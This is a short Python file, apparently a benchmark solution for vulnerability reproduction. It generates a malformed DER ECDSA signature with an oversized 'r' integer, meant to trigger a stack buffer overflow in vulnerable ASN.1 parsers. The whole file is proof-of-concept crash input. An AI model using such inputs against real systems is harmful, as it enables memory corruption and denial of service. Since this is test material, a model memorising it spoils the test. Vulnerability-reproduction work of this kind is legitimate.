import os


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a DER-encoded ECDSA signature with oversized 'r' component to trigger
        # stack buffer overflow in vulnerable ASN.1 parsing implementations.
        #
        # Structure:
        #   0x30 <len_total>
        #     0x02 <r_len> <r bytes>
        #     0x02 <s_len> <s bytes>
        #
        # Choose lengths so that:
        #   - len_total fits in short-form (single-byte) length encoding (< 128)
        #   - r_len is large enough to overflow typical fixed-size stack buffers
        #   - Overall structure is otherwise well-formed DER
        r_len = 120  # large integer length to cause overflow in vulnerable code
        s_len = 3    # small but non-zero
        len_total = 4 + r_len + s_len  # bytes following the length byte

        # Ensure we stay within single-byte length form
        if len_total >= 128:
            # Fallback to a smaller, still-dangerous length if needed
            r_len = 100
            s_len = 20
            len_total = 4 + r_len + s_len

        data = bytearray()

        # SEQUENCE header
        data.append(0x30)
        data.append(len_total)

        # INTEGER r
        data.append(0x02)
        data.append(r_len)
        data.extend(b"\x01" * r_len)  # positive, no leading zeros

        # INTEGER s
        data.append(0x02)
        data.append(s_len)
        data.extend(b"\x01" * s_len)  # positive, no leading zeros

        return bytes(data)
